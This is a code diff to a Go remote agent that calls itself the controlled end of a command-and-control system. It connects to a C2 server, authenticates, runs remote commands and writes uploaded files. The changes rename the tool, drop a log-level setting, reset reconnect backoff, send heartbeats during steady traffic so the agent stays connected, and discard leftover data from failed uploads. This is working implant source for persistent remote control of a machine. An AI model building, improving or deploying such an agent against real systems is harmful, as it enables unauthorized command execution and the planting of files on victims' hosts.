@@ -1,4 +1,4 @@
-// Command irudo_remote is a self-contained Go controlled end for C2Agent.
+// Command c2agent_remote is a self-contained Go controlled end for C2Agent.
 // It speaks the same native protocol (16B header + TLV + ChaCha20) as
 // remote-c / remote-py and the C2, with no third-party dependencies.
 //
@@ -32,7 +32,6 @@ type options struct {
 	cmdTimeout       int
 	reconnectInitial float64
 	reconnectMax     float64
-	logLevel         string
 }
 
 func (o *options) init() {
@@ -40,7 +39,6 @@ func (o *options) init() {
 	o.cmdTimeout = 60
 	o.reconnectInitial = 1
 	o.reconnectMax = 60
-	o.logLevel = "INFO"
 }
 
 type fileConfig struct {
@@ -51,7 +49,6 @@ type fileConfig struct {
 	CmdTimeout       int     `json:"cmd_timeout"`
 	ReconnectInitial float64 `json:"reconnect_initial_sec"`
 	ReconnectMax     float64 `json:"reconnect_max_sec"`
-	LogLevel         string  `json:"log_level"`
 }
 
 func loadConfigFile(path string, o *options) {
@@ -86,13 +83,10 @@ func loadConfigFile(path string, o *options) {
 	if fc.ReconnectMax > 0 {
 		o.reconnectMax = fc.ReconnectMax
 	}
-	if fc.LogLevel != "" {
-		o.logLevel = fc.LogLevel
-	}
 }
 
 func main() {
-	log.SetPrefix("[irudo] ")
+	log.SetPrefix("[c2agent] ")
 	log.SetFlags(log.LstdFlags | log.Lmsgprefix)
 
 	var o options
@@ -106,7 +100,7 @@ func main() {
 		}
 	}
 
-	fs := flag.NewFlagSet("irudo_remote", flag.ExitOnError)
+	fs := flag.NewFlagSet("c2agent_remote", flag.ExitOnError)
 	fs.StringVar(&o.configPath, "config", o.configPath, "optional JSON config file")
 	fs.StringVar(&o.c2Address, "c2-address", o.c2Address, "C2 host:port (required)")
 	fs.StringVar(&o.agentID, "agent-id", o.agentID, "unique agent id (required)")
@@ -115,7 +109,6 @@ func main() {
 	fs.IntVar(&o.cmdTimeout, "cmd-timeout", o.cmdTimeout, "command execution timeout seconds")
 	fs.Float64Var(&o.reconnectInitial, "reconnect-initial", o.reconnectInitial, "initial reconnect delay seconds")
 	fs.Float64Var(&o.reconnectMax, "reconnect-max", o.reconnectMax, "max reconnect delay seconds")
-	fs.StringVar(&o.logLevel, "log-level", o.logLevel, "log level")
 	_ = fs.Parse(os.Args[1:])
 
 	if o.c2Address == "" || o.agentID == "" || o.authToken == "" {
@@ -157,6 +150,12 @@ func run(o *options) int {
 			continue
 		}
 		log.Printf("registered as %s", o.agentID)
+
+		// Successful handshake: reset the reconnect backoff.
+		delay = o.reconnectInitial
+		if delay < 1 {
+			delay = 1
+		}
 
 		shutdown := serve(enc, pr, o)
 		_ = enc.Close()
@@ -266,6 +265,15 @@ func serve(conn net.Conn, pr *packetReader, o *options) bool {
 			case stopDisconnect:
 				return false
 			}
+			// Send a due heartbeat even under a steady packet flow, so the C2
+			// watchdog cannot time us out while commands keep arriving.
+			if time.Since(lastHB) >= hbInterval {
+				if err := sendHeartbeat(conn, nextReq); err != nil {
+					return false
+				}
+				nextReq++
+				lastHB = time.Now()
+			}
 			continue
 		}
 
@@ -331,6 +339,26 @@ func dispatch(conn net.Conn, pr *packetReader, pkt *packet, o *options) dispatch
 	return cont
 }
 
+// drainUpload consumes a failed upload's remaining data packets so the serve
+// loop does not misparse them as commands.
+func drainUpload(conn net.Conn, pr *packetReader, reqID uint64) {
+	for {
+		p, err := readPacket(conn, pr, 30*time.Second)
+		if err != nil {
+			return
+		}
+		if p.cmd >= 0x80 {
+			continue
+		}
+		if p.reqID != reqID || p.cmd == endFlagLast {
+			return
+		}
+		if p.cmd != endFlagContinue {
+			return
+		}
+	}
+}
+
 func handleUpload(conn net.Conn, pr *packetReader, pkt *packet, o *options) {
 	params, err := decodeTLV(pkt.body)
 	if err != nil || len(params) < 1 {
@@ -343,6 +371,7 @@ func handleUpload(conn net.Conn, pr *packetReader, pkt *packet, o *options) {
 	}
 	f, err := os.Create(dest)
 	if err != nil {
+		drainUpload(conn, pr, pkt.reqID)
 		_ = send(conn, buildResponse(pkt.reqID, cmdUpload, "Error: cannot create file: "+err.Error()))
 		return
 	}
@@ -379,6 +408,7 @@ func handleUpload(conn net.Conn, pr *packetReader, pkt *packet, o *options) {
 			fmt.Sprintf("Successfully uploaded: %s (%d bytes)", dest, total)))
 	} else {
 		_ = os.Remove(dest)
+		drainUpload(conn, pr, pkt.reqID)
 		_ = send(conn, buildResponse(pkt.reqID, cmdUpload, "Error: upload failed"))
 	}
 }
